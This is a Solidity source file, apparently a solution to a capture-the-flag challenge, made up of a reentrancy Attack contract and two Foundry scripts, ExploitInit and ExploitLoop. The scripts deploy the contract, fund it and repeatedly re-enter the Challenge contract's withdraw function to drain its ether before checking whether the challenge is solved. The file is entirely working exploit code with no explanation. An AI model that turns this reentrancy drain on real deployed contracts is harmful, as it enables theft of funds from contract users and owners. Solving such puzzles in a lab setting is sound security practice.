// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.13;

import "./container/contracts/Challenge.sol";
import "./container/contracts/Coin.sol";
import "./forge-std/Script.sol";

contract Attack {
    Challenge challenge;
    uint256 iterations;
    uint256 totalIterations;
    constructor(address _challenge) {
        challenge = Challenge(_challenge);
    }

    function attack(uint256 iters) external payable {
        totalIterations = iters;
        challenge.deposit{value: msg.value}();
        challenge.withdraw();
    }

    function withdraw() external payable {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
    }

    receive() external payable {
        if (iterations < totalIterations) {
            iterations++;
            challenge.withdraw();
        }
    }
}

contract ExploitInit is Script {
    Challenge challenge;
    function run() public payable {
        vm.startBroadcast();
        challenge = Challenge(vm.envAddress("CHALL"));
        challenge.hello();

        console.log("Is solved?", challenge.isSolved());

        Attack attack = new Attack(address(challenge));
        challenge.deposit{value: 5 ether}();
        attack.attack{value: 5 ether}(21);
        attack.withdraw();

        vm.stopBroadcast();
    }
}

contract ExploitLoop is Script {
    Challenge challenge;
    function run() public payable {
        vm.startBroadcast();
        challenge = Challenge(vm.envAddress("CHALL"));
        MinionCoin coin = MinionCoin(address(challenge.coin()));
        Attack attack = new Attack(address(challenge));

        challenge.deposit{value: 100 ether}();
        challenge.buyCoin(100);

        challenge.deposit{value: 5 ether}();
        attack.attack{value: 5 ether}(21);
        attack.withdraw();

        console.log("Is solved?", challenge.isSolved());
        console.log("Coins:", coin.coinsOf(address(msg.sender)));

        vm.stopBroadcast();
    }
}
